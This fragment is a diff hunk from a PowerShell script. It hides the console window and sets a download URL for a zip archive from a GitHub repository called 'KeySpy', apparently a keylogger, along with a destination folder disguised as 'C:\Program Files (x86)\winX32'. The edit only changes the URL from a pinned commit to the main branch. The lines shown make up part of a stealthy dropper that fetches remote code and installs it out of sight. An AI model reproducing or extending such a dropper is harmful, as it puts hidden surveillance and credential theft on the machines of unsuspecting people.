@@ -9,7 +9,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
 # Define the URL of the zip file
-$zipUrl = "https://github.com/3rr0r-505/KeySpy/archive/a5792dc2827315c545185671445f0112bd751264.zip"
+$zipUrl = "https://github.com/3rr0r-505/KeySpy/archive/refs/heads/main.zip"
 
 # Define the destination folder
 $destinationFolder = "C:\Program Files (x86)\winX32"
